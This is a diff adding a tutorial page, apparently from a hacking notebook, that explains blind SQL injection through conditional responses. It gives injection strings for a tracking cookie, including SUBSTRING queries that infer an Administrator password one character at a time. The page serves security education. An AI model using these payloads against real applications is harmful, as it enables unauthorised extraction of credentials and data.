@@ -1,0 +1,57 @@
+---
+title: "Blind SQL Injection"
+description: "Extract data from databases where query results aren't returned in the HTTP response."
+---
+
+## What is Blind SQL Injection?
+
+Blind SQLi is when the application is vulnerable but HTTP responses don't return query results or error details — making UNION attacks ineffective since there's nothing to read back.
+
+## Exploiting via Conditional Responses
+
+Consider a tracking cookie processed like this:
+
+<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FeYoKCvvW5ZC8IS3Sia9g%252Fimage.png%3Falt%3Dmedia%26token%3Dc2ec0014-53e1-40c3-af1a-ed3254bbb84d&width=768&dpr=3&quality=100&sign=d5379125&sv=2" alt="Blind SQL injection tracking cookie" />
+
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
+
+The app shows a **"Welcome back"** message if the query returns results — nothing otherwise. That single boolean difference is enough to extract data.
+
+Injecting two conditions back to back:
+
+```sql
+xyz' AND '1'='1   ← true  → "Welcome back" shown
+xyz' AND '1'='2   ← false → "Welcome back" gone
+```
+
+This lets you ask yes/no questions against the database and infer data one bit at a time.
+
+## Extracting Data Character by Character
+
+To brute-force the `Administrator` password, test one character at a time using `SUBSTRING`:
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+```
+
+- "Welcome back" shown → first char is **after** `m` in the alphabet
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+```
+
+- No "Welcome back" → first char is **not after** `t`
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+```
+
+- "Welcome back" shown → first char is **`s`** ✓
+
+Repeat for each character position until the full password is recovered.
+
+<Warning>
+  `SUBSTRING` is called `SUBSTR` on some databases — check the SQL injection cheat sheet.
+</Warning>
